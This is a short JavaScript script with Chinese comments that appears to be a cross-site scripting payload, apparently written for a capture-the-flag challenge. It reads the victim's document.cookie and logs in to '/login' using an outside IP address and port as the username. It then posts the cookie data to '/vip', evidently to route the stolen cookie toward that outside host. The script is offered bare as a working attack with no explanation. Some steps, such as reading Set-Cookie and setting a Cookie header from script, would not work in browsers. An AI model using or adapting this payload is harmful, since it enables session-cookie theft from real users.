// 创建表单
var dataForm = new FormData();
dataForm.append('cookie', document.cookie);

var xhr1 = new XMLHttpRequest();
var params = 'username=http://101.42.45.248:23339&password=3a4431c88e8c42ead3187b136b80f0dd';
xhr1.open('POST', '/login');
xhr1.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr1.onreadystatechange = function () {
    if (xhr1.readyState === 4 && xhr1.status === 200) {
        // 获取 Cookie
        var cookie = xhr1.getResponseHeader('Set-Cookie');

        var xhr2 = new XMLHttpRequest();
        xhr2.open('POST', '/vip');
        xhr2.onreadystatechange = function () {
            if (xhr2.readyState === 4 && xhr2.status === 200) {
                // 处理数据请求的响应
                console.log(xhr2.responseText);
            }
        };
        // 设置请求头带上 Cookie
        xhr2.setRequestHeader('Cookie', cookie);
        // 发送表单
        xhr2.send(dataForm);
    }
};
xhr1.send(params);
